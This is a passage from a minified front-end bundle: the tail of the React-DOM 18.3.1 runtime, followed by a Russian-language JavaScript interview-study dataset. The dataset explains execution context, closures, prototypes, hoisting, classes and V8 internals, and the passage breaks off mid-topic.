14:t=Li(null,t,r,Me(r.type,e),n);break e}throw Error(S(306,r,""))}return t;case 0:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Me(r,o),Ml(e,t,r,o,n);case 1:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Me(r,o),Ni(e,t,r,o,n);case 3:e:{if(_u(t),e===null)throw Error(S(387));r=t.pendingProps,l=t.memoizedState,o=l.element,cu(e,t),$r(t,r,null,n);var s=t.memoizedState;if(r=s.element,l.isDehydrated)if(l={element:r,isDehydrated:!1,cache:s.cache,pendingSuspenseBoundaries:s.pendingSuspenseBoundaries,transitions:s.transitions},t.updateQueue.baseState=l,t.memoizedState=l,t.flags&256){o=on(Error(S(423)),t),t=Oi(e,t,r,n,o);break e}else if(r!==o){o=on(Error(S(424)),t),t=Oi(e,t,r,n,o);break e}else for(ge=it(t.stateNode.containerInfo.firstChild),ve=t,F=!0,De=null,n=au(t,null,r,n),t.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(tn(),r===o){t=Ke(e,t,n);break e}se(e,t,r,n)}t=t.child}return t;case 5:return du(t),e===null&&Tl(t),r=t.type,o=t.pendingProps,l=e!==null?e.memoizedProps:null,s=o.children,Sl(r,o)?s=null:l!==null&&Sl(r,l)&&(t.flags|=32),Iu(e,t),se(e,t,s,n),t.child;case 6:return e===null&&Tl(t),null;case 13:return Fu(e,t,n);case 4:return vs(t,t.stateNode.containerInfo),r=t.pendingProps,e===null?t.child=nn(t,null,r,n):se(e,t,r,n),t.child;case 11:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Me(r,o),Di(e,t,r,o,n);case 7:return se(e,t,t.pendingProps,n),t.child;case 8:return se(e,t,t.pendingProps.children,n),t.child;case 12:return se(e,t,t.pendingProps.children,n),t.child;case 10:e:{if(r=t.type._context,o=t.pendingProps,l=t.memoizedProps,s=o.value,A(Jr,r._currentValue),r._currentValue=s,l!==null)if(Oe(l.value,s)){if(l.children===o.children&&!fe.current){t=Ke(e,t,n);break e}}else for(l=t.child,l!==null&&(l.return=t);l!==null;){var i=l.dependencies;if(i!==null){s=l.child;for(var a=i.firstContext;a!==null;){if(a.context===r){if(l.tag===1){a=Ve(-1,n&-n),a.tag=2;var c=l.updateQueue;if(c!==null){c=c.shared;var g=c.pending;g===null?a.next=a:(a.next=g.next,g.next=a),c.pending=a}}l.lanes|=n,a=l.alternate,a!==null&&(a.lanes|=n),El(l.return,n,t),i.lanes|=n;break}a=a.next}}else if(l.tag===10)s=l.type===t.type?null:l.child;else if(l.tag===18){if(s=l.return,s===null)throw Error(S(341));s.lanes|=n,i=s.alternate,i!==null&&(i.lanes|=n),El(s,n,t),s=l.sibling}else s=l.child;if(s!==null)s.return=l;else for(s=l;s!==null;){if(s===t){s=null;break}if(l=s.sibling,l!==null){l.return=s.return,s=l;break}s=s.return}l=s}se(e,t,o.children,n),t=t.child}return t;case 9:return o=t.type,r=t.pendingProps.children,Yt(t,n),o=Ee(o),r=r(o),t.flags|=1,se(e,t,r,n),t.child;case 14:return r=t.type,o=Me(r,t.pendingProps),o=Me(r.type,o),Li(e,t,r,o,n);case 15:return Ou(e,t,t.type,t.pendingProps,n);case 17:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Me(r,o),Rr(e,t),t.tag=1,pe(r)?(e=!0,Wr(t)):e=!1,Yt(t,n),Du(t,r,o),jl(t,r,o,n),bl(null,t,r,!0,e,n);case 19:return zu(e,t,n);case 22:return Au(e,t,n)}throw Error(S(156,t.tag))};function tc(e,t){return Ra(e,t)}function Mf(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function xe(e,t,n,r){return new Mf(e,t,n,r)}function Ls(e){return e=e.prototype,!(!e||!e.isReactComponent)}function bf(e){if(typeof e=="function")return Ls(e)?1:0;if(e!=null){if(e=e.$$typeof,e===Yl)return 11;if(e===ql)return 14}return 2}function dt(e,t){var n=e.alternate;return n===null?(n=xe(e.tag,t,e.key,e.mode),n.elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=e.flags&14680064,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function Dr(e,t,n,r,o,l){var s=2;if(r=e,typeof e=="function")Ls(e)&&(s=1);else if(typeof e=="string")s=5;else e:switch(e){case It:return Et(n.children,o,l,t);case Xl:s=8,o|=8;break;case Yo:return e=xe(12,n,t,o|2),e.elementType=Yo,e.lanes=l,e;case qo:return e=xe(13,n,t,o),e.elementType=qo,e.lanes=l,e;case Zo:return e=xe(19,n,t,o),e.elementType=Zo,e.lanes=l,e;case da:return ho(n,o,l,t);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case ua:s=10;break e;case ca:s=9;break e;case Yl:s=11;break e;case ql:s=14;break e;case qe:s=16,r=null;break e}throw Error(S(130,e==null?e:typeof e,""))}return t=xe(s,n,t,o),t.elementType=e,t.type=r,t.lanes=l,t}function Et(e,t,n,r){return e=xe(7,e,r,t),e.lanes=n,e}function ho(e,t,n,r){return e=xe(22,e,r,t),e.elementType=da,e.lanes=n,e.stateNode={isHidden:!1},e}function $o(e,t,n){return e=xe(6,e,null,t),e.lanes=n,e}function Ko(e,t,n){return t=xe(4,e.children!==null?e.children:[],e.key,t),t.lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function Df(e,t,n,r,o){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Ro(0),this.expirationTimes=Ro(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Ro(0),this.identifierPrefix=r,this.onRecoverableError=o,this.mutableSourceEagerHydrationData=null}function Ns(e,t,n,r,o,l,s,i,a){return e=new Df(e,t,n,i,a),t===1?(t=1,l===!0&&(t|=8)):t=0,l=xe(3,null,null,t),e.current=l,l.stateNode=e,l.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},gs(l),e}function Lf(e,t,n){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:At,key:r==null?null:""+r,children:e,containerInfo:t,implementation:n}}function nc(e){if(!e)return pt;e=e._reactInternals;e:{if(Lt(e)!==e||e.tag!==1)throw Error(S(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(pe(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(t!==null);throw Error(S(171))}if(e.tag===1){var n=e.type;if(pe(n))return nu(e,n,t)}return t}function rc(e,t,n,r,o,l,s,i,a){return e=Ns(n,r,!0,e,o,l,s,i,a),e.context=nc(null),n=e.current,r=ie(),o=ct(n),l=Ve(r,o),l.callback=t??null,at(n,l,o),e.current.lanes=o,Yn(e,o,r),me(e,r),e}function go(e,t,n,r){var o=t.current,l=ie(),s=ct(o);return n=nc(n),t.context===null?t.context=n:t.pendingContext=n,t=Ve(l,s),t.payload={element:e},r=r===void 0?null:r,r!==null&&(t.callback=r),e=at(o,t,s),e!==null&&(Ne(e,o,s,l),Er(e,o,s)),s}function to(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Vi(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var n=e.retryLane;e.retryLane=n!==0&&n<t?n:t}}function Os(e,t){Vi(e,t),(e=e.alternate)&&Vi(e,t)}function Nf(){return null}var oc=typeof reportError=="function"?reportError:function(e){console.error(e)};function As(e){this._internalRoot=e}vo.prototype.render=As.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(S(409));go(e,t,null,null)};vo.prototype.unmount=As.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;bt(function(){go(null,e,null,null)}),t[Ge]=null}};function vo(e){this._internalRoot=e}vo.prototype.unstable_scheduleHydration=function(e){if(e){var t=Aa();e={blockedOn:null,target:e,priority:t};for(var n=0;n<et.length&&t!==0&&t<et[n].priority;n++);et.splice(n,0,e),n===0&&_a(e)}};function Is(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function yo(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function Ji(){}function Of(e,t,n,r,o){if(o){if(typeof r=="function"){var l=r;r=function(){var c=to(s);l.call(c)}}var s=rc(t,r,e,0,null,!1,!1,"",Ji);return e._reactRootContainer=s,e[Ge]=s.current,Un(e.nodeType===8?e.parentNode:e),bt(),s}for(;o=e.lastChild;)e.removeChild(o);if(typeof r=="function"){var i=r;r=function(){var c=to(a);i.call(c)}}var a=Ns(e,0,!1,null,null,!1,!1,"",Ji);return e._reactRootContainer=a,e[Ge]=a.current,Un(e.nodeType===8?e.parentNode:e),bt(function(){go(t,a,n,r)}),a}function So(e,t,n,r,o){var l=n._reactRootContainer;if(l){var s=l;if(typeof o=="function"){var i=o;o=function(){var a=to(s);i.call(a)}}go(t,s,e,o)}else s=Of(n,t,e,o,r);return to(s)}Na=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var n=Cn(t.pendingLanes);n!==0&&(ts(t,n|1),me(t,J()),!(L&6)&&(ln=J()+500,gt()))}break;case 13:bt(function(){var r=$e(e,1);if(r!==null){var o=ie();Ne(r,e,1,o)}}),Os(e,1)}};ns=function(e){if(e.tag===13){var t=$e(e,134217728);if(t!==null){var n=ie();Ne(t,e,134217728,n)}Os(e,134217728)}};Oa=function(e){if(e.tag===13){var t=ct(e),n=$e(e,t);if(n!==null){var r=ie();Ne(n,e,t,r)}Os(e,t)}};Aa=function(){return N};Ia=function(e,t){var n=N;try{return N=e,t()}finally{N=n}};ul=function(e,t,n){switch(t){case"input":if(nl(e,n),t=n.name,n.type==="radio"&&t!=null){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<n.length;t++){var r=n[t];if(r!==e&&r.form===e.form){var o=ao(r);if(!o)throw Error(S(90));pa(r),nl(r,o)}}}break;case"textarea":ha(e,n);break;case"select":t=n.value,t!=null&&$t(e,!!n.multiple,t,!1)}};Ca=Ms;xa=bt;var Af={usingClientEntryPoint:!1,Events:[Zn,Ht,ao,wa,ka,Ms]},Sn={findFiberByHostInstance:kt,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},If={bundleType:Sn.bundleType,version:Sn.version,rendererPackageName:Sn.rendererPackageName,rendererConfig:Sn.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Qe.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=Pa(e),e===null?null:e.stateNode},findFiberByHostInstance:Sn.findFiberByHostInstance||Nf,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Sr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Sr.isDisabled&&Sr.supportsFiber)try{oo=Sr.inject(If),Fe=Sr}catch{}}Se.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Af;Se.createPortal=function(e,t){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!Is(t))throw Error(S(200));return Lf(e,t,null,n)};Se.createRoot=function(e,t){if(!Is(e))throw Error(S(299));var n=!1,r="",o=oc;return t!=null&&(t.unstable_strictMode===!0&&(n=!0),t.identifierPrefix!==void 0&&(r=t.identifierPrefix),t.onRecoverableError!==void 0&&(o=t.onRecoverableError)),t=Ns(e,1,!1,null,null,n,!1,r,o),e[Ge]=t.current,Un(e.nodeType===8?e.parentNode:e),new As(t)};Se.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(S(188)):(e=Object.keys(e).join(","),Error(S(268,e)));return e=Pa(t),e=e===null?null:e.stateNode,e};Se.flushSync=function(e){return bt(e)};Se.hydrate=function(e,t,n){if(!yo(t))throw Error(S(200));return So(null,e,t,!0,n)};Se.hydrateRoot=function(e,t,n){if(!Is(e))throw Error(S(405));var r=n!=null&&n.hydratedSources||null,o=!1,l="",s=oc;if(n!=null&&(n.unstable_strictMode===!0&&(o=!0),n.identifierPrefix!==void 0&&(l=n.identifierPrefix),n.onRecoverableError!==void 0&&(s=n.onRecoverableError)),t=rc(t,null,e,1,n??null,o,!1,l,s),e[Ge]=t.current,Un(e),r)for(e=0;e<r.length;e++)n=r[e],o=n._getVersion,o=o(n._source),t.mutableSourceEagerHydrationData==null?t.mutableSourceEagerHydrationData=[n,o]:t.mutableSourceEagerHydrationData.push(n,o);return new vo(t)};Se.render=function(e,t,n){if(!yo(t))throw Error(S(200));return So(null,e,t,!1,n)};Se.unmountComponentAtNode=function(e){if(!yo(e))throw Error(S(40));return e._reactRootContainer?(bt(function(){So(null,null,e,!1,function(){e._reactRootContainer=null,e[Ge]=null})}),!0):!1};Se.unstable_batchedUpdates=Ms;Se.unstable_renderSubtreeIntoContainer=function(e,t,n,r){if(!yo(n))throw Error(S(200));if(e==null||e._reactInternals===void 0)throw Error(S(38));return So(e,t,n,!1,r)};Se.version="18.3.1-next-f1338f8080-20240426";function lc(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(lc)}catch(e){console.error(e)}}lc(),la.exports=Se;var _f=la.exports,Gi=_f;Qo.createRoot=Gi.createRoot,Qo.hydrateRoot=Gi.hydrateRoot;const no={1:{label:"INTERN",color:"#8b949e"},2:{label:"JUNIOR",color:"#3fb950"},3:{label:"MIDDLE",color:"#d29922"},4:{label:"SENIOR",color:"#f85149"}},Ff=[{id:"js",title:"JS",icon:"⚡",color:"#F0DB4F",topics:[{name:"Определение контекста выполнения, случаи применения",level:"2",content:`**Контекст выполнения (Execution Context)** — структура, которая создаётся при каждом вызове функции.

Состоит из двух компонентов:
• **Lexical Environment** — для \`let\`, \`const\`, function declarations
• **Variable Environment** — для \`var\`

**this определяется способом вызова функции, НЕ местом объявления.**

Способы вызова и значение this:
\`\`\`js
obj.method()        // this = obj (метод объекта)
func()              // this = window / undefined (свободный вызов)
func.call(ctx)      // this = ctx (явная привязка)
func.apply(ctx)     // this = ctx (явная привязка)
func.bind(ctx)()    // this = ctx (жёсткая привязка)
new Func()          // this = новый объект
\`\`\`

**Шаги оператора new:**
1. Создаётся пустой объект \`{}\`
2. \`__proto__\` нового объекта → \`Function.prototype\`
3. \`this\` внутри функции указывает на новый объект
4. Выполняется тело функции
5. Если return объект → вернётся он; если примитив/ничего → свой объект`,score:3.5},{name:"Вычисление контекста, его значение по умолчанию",level:"2",content:"**Reference Type** — внутренний тип спецификации. При вычислении `obj.method` движок получает:\n```\n{ base: obj, name: 'method', strict: false }\n```\n\n**GetValue()** — внутренняя операция, которая извлекает значение из Reference Type, уничтожая base.\n\nВызывается при: присваивании (`=`), логических операторах (`||`, `&&`), операторе запятая.\n**НЕ вызывается** при группировке `()`.\n\n```js\nobj.method()              // Reference Type жив → this = obj\n(obj.method)()            // группировка не ломает → this = obj\n(obj.method = obj.method)() // присваивание → GetValue() → this = window\n(false || obj.method)()   // || → GetValue() → this = window\n```\n\n**Boxing (нестрогий режим):**\n• `null` / `undefined` → `window`\n• Примитив → обёртка: `7` → `Number{7}`\n\n```js\nfunction foo() { console.log(this); }\n\n// Нестрогий режим:\nfoo.call(null);      // this → window\nfoo.call(undefined); // this → window\nfoo.call(7);         // this → Number {7}  ← boxing!\nfoo.call('hi');      // this → String {'hi'} ← boxing!\n\n// Strict mode — boxing не происходит:\nfoo.call(7);         // this → 7 (просто примитив)\nfoo.call(null);      // this → null\n```\n\n**Правило:** нестрогий → null/undefined заменяются на window, примитивы оборачиваются в объект. Строгий → что передал, то и получил.",score:2.5},{name:"Сохранение контекста выполнения через замыкание",level:"2",content:`**Замыкание** — функция + её ссылка \`[[Environment]]\` на лексическое окружение, в котором она была создана.

**\`[[Environment]]\`** — скрытое свойство каждой функции, устанавливается в момент **СОЗДАНИЯ** (не вызова!).

Сборщик мусора не удаляет лексическое окружение, пока на него есть ссылка из \`[[Environment]]\`.

**Приём const self = this:**
\`\`\`js
function Timer() {
  this.seconds = 0;
  const self = this; // сохраняем через замыкание
  setInterval(function() {
    self.seconds++;
  }, 1000);
}
\`\`\`

**Классическая задача var + цикл:**
\`\`\`js
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000);
} // 3, 3, 3

// Решение 1: IIFE
for (var i = 0; i < 3; i++) {
  (function(j) {
    setTimeout(() => console.log(j), 1000);
  })(i);
}

// Решение 2: let
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000);
} // 0, 1, 2 — спецификация for+let создаёт новое ЛО на каждую итерацию
\`\`\``,score:3},{name:"Потеря контекста",level:"2",content:`**3 случая потери контекста:**

1. **Присваивание метода в переменную:**
\`\`\`js
const fn = obj.greet; // GetValue() → base потерян
fn(); // this = window/undefined
\`\`\`

2. **Передача метода как колбэка:**
\`\`\`js
setTimeout(obj.greet, 1000); // GetValue() → base потерян
\`\`\`

3. **Вложенная функция внутри метода:**
\`\`\`js
const obj = {
  method() {
    function inner() {
      console.log(this); // window — inner имеет base = ЛО (не объект)
    }
    inner();
  }
};
\`\`\`

**4 способа исправить:**
1. **Стрелочная функция** — не создаёт свой this
2. **bind** — возвращает функцию с привязанным this
3. **const self = this** — замыкание
4. **call/apply** — для немедленного вызова`,score:4},{name:"Виды объявления переменных, Function declaration и Function expression, NFE, IIFE",level:"2",content:`**var**: область видимости — функция/скрипт, всплывает с \`undefined\`
**let/const**: область видимости — блок, всплывает как \`uninitialized\` (TDZ)

**Function Declaration vs Expression:**
• FD — полностью всплывает (можно вызвать до объявления)
• FE — следует правилам переменной, в которую присвоен

**Приоритет при одном имени:** function declaration перезаписывает var при всплытии.

**NFE (Named Function Expression):**
\`\`\`js
const sayHi = function greeting() {
  // greeting доступно только здесь
  // хранится в промежуточном ЛО как immutable
  // Перезаписать нельзя
};
greeting(); // ReferenceError — снаружи не видно
\`\`\`
Зачем: надёжная рекурсия (не зависит от внешней переменной) + отладка (имя в stack trace).

**IIFE:** Создаёт изолированную область видимости. До ES6 — основной инструмент модульности. Сейчас заменён \`let/const\`, блоками, модулями.`,score:3.5},{name:"Всплытие переменных",level:"2",content:`Движок проходит код дважды:
1. **Регистрация** — var → \`undefined\`, let/const → \`uninitialized\`, FD → полностью
2. **Выполнение** — построчно

**TDZ (Temporal Dead Zone):** промежуток от начала блока до строки объявления let/const. Обращение → ReferenceError.

\`\`\`js
let x = 'outer';
{
  console.log(x); // ReferenceError, НЕ 'outer'!
  let x = 'inner'; // TS знает о нём с начала блока
}
\`\`\`

**function declaration внутри блока:**
• Нестрогий режим: всплывает только имя как var (\`undefined\`), функция не поднимается
• Strict mode: блочная видимость, не всплывает наружу вообще

**Разница ЛО блока и функции:**
• Функция: Lexical Environment + Variable Environment
• Блок: только Lexical Environment (var пролетает мимо блока)`,score:4},{name:"Что такое замыкание?",level:"2",content:"**Замыкание** — сама функция вместе с её ссылкой `[[Environment]]` на лексическое окружение, в котором она была создана.\n\nТехнически **каждая** функция в JS — замыкание, потому что каждая получает `[[Environment]]`. Заметно когда внутренняя функция живёт дольше внешней.\n\n**Механика:**\n1. Функция создаётся → получает `[[Environment]]` → ссылка на текущее ЛО\n2. Функция вызывается → создаётся новое ЛО, `outer` = `[[Environment]]`\n3. Поиск переменных идёт по цепочке `outer`\n4. `[[Environment]]` уже не участвует — он сделал своё дело на шаге 2\n\nСборщик мусора не удаляет ЛО, пока на него ссылается `[[Environment]]` живой функции.",score:4},{name:"Определение класса. Синтаксис классов. Наследование",level:"2",content:`**typeof class = "function"** — синтаксический сахар.

**Отличия class от функции-конструктора:**
1. Без \`new\` — TypeError
2. Методы неперечислимые
3. Всегда strict mode
4. Не всплывает

**extends создаёт ДВЕ цепочки:**
\`\`\`js
Admin.prototype.__proto__ === User.prototype // для экземпляров
Admin.__proto__ === User                     // для статики
\`\`\`

**super():**
• В конструкторе — вызывает конструктор родителя, создаёт this
• В методе — обращается к методу родительского прототипа
• Без super() в дочернем конструкторе — ReferenceError при обращении к this

**User.prototype** по умолчанию = \`{ constructor: User }\`

**Приватные методы:**
\`\`\`js
class User {
  #name;
  constructor(name) { this.#name = name; }
  #validate() { return this.#name.length > 0; }
  getName() { return this.#validate() ? this.#name : null; }
}
\`\`\`

**Порядок инициализации полей:**
1. Поля родителя (class fields)
2. Конструктор родителя (super())
3. Поля дочернего класса
4. Конструктор дочернего класса

**Mixin-паттерн** (псевдо-множественное наследование):
\`\`\`js
const Serializable = (Base) => class extends Base {
  serialize() { return JSON.stringify(this); }
};
const Validatable = (Base) => class extends Base {
  validate() { return Object.values(this).every(v => v !== null); }
};
class User extends Serializable(Validatable(EventEmitter)) { ... }
\`\`\`
Каждый mixin — функция (Base) => class extends Base. Цепочка прототипов линейна, нет diamond problem.`,score:3.5},{name:"Подмена существующего контекста",level:"2",content:`**call(ctx, a, b)** — вызывает сразу, аргументы через запятую
**apply(ctx, [a, b])** — вызывает сразу, аргументы массивом (A = Array)
**bind(ctx)** — НЕ вызывает, возвращает новую функцию

**bind привязывает навсегда.** Повторный bind/call/apply не перебьёт. Под капотом создаётся exotic object с \`[[BoundThis]]\`.

**Стрелочная функция** — подмена this НЕВОЗМОЖНА. call/apply/bind игнорируются. this ищется как переменная по \`[[Environment]]\`.

**React классовые компоненты:**
\`\`\`js
// Вариант 1: bind в конструкторе
this.handleClick = this.handleClick.bind(this);

// Вариант 2: стрелочная функция как поле класса
handleClick = () => { ... }
\`\`\``,score:3},{name:"Лексическое окружение",level:"3",content:`**Лексическое окружение (Lexical Environment)** — структура данных, хранящая:
• **Environment Record** — привязки идентификаторов к значениям
• **outer** — ссылка на внешнее ЛО

Создаётся при каждом вызове функции и для каждого блока (для let/const).

**Поиск переменных:** своё ЛО → outer → ... → глобальное ЛО → null → ReferenceError

**\`[[Environment]]\`:**
• Устанавливается в момент **создания** функции
• При вызове функции: новое ЛО, его outer = \`[[Environment]]\`

**Промежуточное ЛО у NFE:**
\`\`\`
Внутреннее ЛО функции
  ↓ outer
Промежуточное { greeting: <функция> } (immutable)
  ↓ outer
Внешнее ЛО
\`\`\``,score:4.5},{name:"Определение прототипа. Цепочка прототипов, механизм поиска свойств",level:"3",content:`**\`[[Prototype]]\`** — скрытое свойство объекта, доступно через \`__proto__\` (геттер/сеттер).

**Два механизма поиска:**
• Переменные: по цепочке outer (статически, при создании) → ReferenceError
• Свойства: по цепочке __proto__ (динамически, можно менять) → undefined

**Shadowing:** запись свойства ВСЕГДА на самом объекте, не поднимается по цепочке.

**this в методе прототипа:** неважно где метод найден, this = объект перед точкой.

\`\`\`js
hasOwnProperty('prop')  // проверка собственного свойства
for...in                // включая прототип
Object.keys()           // только собственные
\`\`\`

**Конец цепочки:** Object.prototype → null

**Object.create():**
\`\`\`js
// Создать объект с конкретным прототипом
const animal = { breathe() { return true; } };
const dog = Object.create(animal);
dog.bark = () => 'Woof';
Object.getPrototypeOf(dog) === animal; // true

// Объект без прототипа — чистый hash map (нет toString, hasOwnProperty и т.д.)
const map = Object.create(null);
map['key'] = 'value'; // никогда не конфликтует с prototype методами
\`\`\`

**Object.getPrototypeOf vs __proto__:**
\`__proto__\` — устаревший геттер/сеттер на Object.prototype.
\`Object.getPrototypeOf(obj)\` — стандартный API, используй его.
\`Object.setPrototypeOf(obj, proto)\` — изменить прототип у существующего объекта. Избегай в горячем коде: переводит объект в slow mode (V8 сбрасывает Hidden Class).

**Function.prototype — свойство конструктора**

У каждой функции есть свойство \`.prototype\` — объект, от которого наследуют экземпляры, созданные через \`new\`:
\`\`\`js
function Dog(name) { this.name = name; }
Dog.prototype.bark = function() { return 'Woof, ' + this.name; };

const rex = new Dog('Rex');
rex.bark();                                   // 'Woof, Rex'
Object.getPrototypeOf(rex) === Dog.prototype; // true
\`\`\`

**Шаги оператора new с prototype:**
\`\`\`js
// new Dog('Rex') делает примерно:
const obj = Object.create(Dog.prototype); // [[Prototype]] = Dog.prototype
Dog.call(obj, 'Rex');                     // заполняем свойства
return obj;
\`\`\`

**constructor** — свойство на \`prototype\`, ссылается обратно на функцию:
\`\`\`js
Dog.prototype.constructor === Dog; // true
rex.constructor === Dog;           // true (через цепочку)
\`\`\`

Если заменить весь \`prototype\` объектом — \`constructor\` теряется:
\`\`\`js
Dog.prototype = { bark() {} };                    // constructor: Object!
Dog.prototype = { constructor: Dog, bark() {} };  // правильно
\`\`\`

**[[Prototype]] vs .prototype — главная путаница:**
• \`[[Prototype]]\` — скрытая ссылка на прото-объект, есть у всех объектов, читается через \`Object.getPrototypeOf()\`
• \`.prototype\` — обычное свойство, есть только у функций, используется оператором \`new\`

**Встроенные цепочки:**
\`\`\`js
[].__proto__ === Array.prototype              // true
Array.prototype.__proto__ === Object.prototype // true
Object.prototype.__proto__ === null           // конец цепочки

function f() {}
f.__proto__ === Function.prototype            // true (f — тоже объект)
\`\`\``,score:4},{name:"Особенности стрелочных функций. Отличия от классических",level:"3",content:"**6 отличий:**\n1. Нет своего this — берёт из `[[Environment]]`\n2. Нет `arguments`\n3. Нельзя вызвать через `new`\n4. Нет свойства `prototype`\n5. Не может быть генератором\n6. Краткий синтаксис\n\nthis внутри стрелочной функции **есть** и работает, но она не создаёт **свой**. Ищет как обычную переменную по цепочке ЛО.\n\n`call/apply/bind` полностью **игнорируются** — подменить this невозможно.",score:4},{name:"Принципы работы сборщика мусора в V8",level:"4",content:`**Принцип достижимости (reachability):** всё, до чего можно добраться от корней — живое.

**Корни (roots):**
1. Глобальный объект (window/global)
2. Стек вызовов (локальные переменные выполняющихся функций)
3. Замыкания (ЛО со ссылками из живых функций)

**Два поколения памяти:**

**Young Generation → Scavenger (Minor GC):**
• Маленькая область для новых объектов
• Два полупространства: from-space и to-space
• Живые копируются в to-space, from-space очищается, роли меняются
• Быстрый, частый

**Old Generation → Mark-Sweep-Compact (Major GC):**
• Mark — помечает живые от корней
• Sweep — освобождает непомеченные
• Compact — уплотняет, убирая фрагментацию
• Медленный, редкий

**Promotion:** объект пережил 2 сборки в Young → Old

**Оптимизации пауз GC в V8:**

**• Incremental Marking** — фаза Mark разбита на порции по 5-10мс, между которыми выполняется JS. Без этого обход всего графа объектов блокировал поток на десятки-сотни мс. Побочный эффект: пока идут порции, JS может изменить ссылки. Решение — **write barrier**: при каждой записи свойства V8 помечает объект «изменён» и перепроверяет его в следующей порции.

**• Concurrent Marking/Sweeping/Compacting** — фазы Sweep и Compact выполняются в отдельных worker-потоках параллельно с JS. С 2018 года часть фазы Mark тоже идёт параллельно, основной поток только финализирует результат.

**• Lazy Sweeping** — после Mark движок знает мёртвые объекты, но не торопится очищать. Sweep происходит лениво — только когда нужно выделить новую память и страница заполнена. Стоимость очистки размазывается во времени.

**Итог:** без оптимизаций пауза Major GC — 100-500мс (заметный фриз). С оптимизациями — основной поток блокируется на 1-5мс, остальное параллельно.`,score:2.5},{name:"Процесс обработки кода в V8: AST, лексический анализ, JIT, деоптимизация",level:"4",content:`**Pipeline V8:**
\`\`\`
Исходный код → Токены → AST → Байткод (Ignition) → Машинный код (TurboFan)
\`\`\`

**Процесс обработки кода в V8:**

**1. Лексический анализ (Tokenization/Lexing):**
Движок получает исходный код как текст. Первым делом разбивает его на токены — минимальные значимые единицы. Например const x = 10 + 5; → [const][x][=][10][+][5][;]. Каждый токен имеет тип (ключевое слово, идентификатор, оператор, число, пунктуация).
V8 делает это двумя способами:

Eager parsing (полный) — для кода, который нужен прямо сейчас (верхний уровень скрипта, немедленно вызываемые функции)
Lazy parsing (pre-parsing) — для тел функций, которые могут никогда не вызваться. Pre-parser не строит AST, только проверяет синтаксические ошибки и запоминает границы функции (где начинается, где заканчивается). Полный парсинг произойдёт только при первом вызове. Это критично для ускорения старта — представь бандл на 2MB JS, из которого при загрузке реально выполняется 20%.

**2. Синтаксический анализ (Parsing) → AST:**
Из плоского списка токенов строится Abstract Syntax Tree — дерево, где каждый узел представляет операцию или конструкцию. AST нужен потому что токены — плоский список, а код имеет вложенную структуру: приоритеты операций (* раньше +), вложенные блоки, scope. Дерево разрешает эти связи и позволяет дальше генерировать код и оптимизировать.

**3. Ignition (интерпретатор) → байткод:**
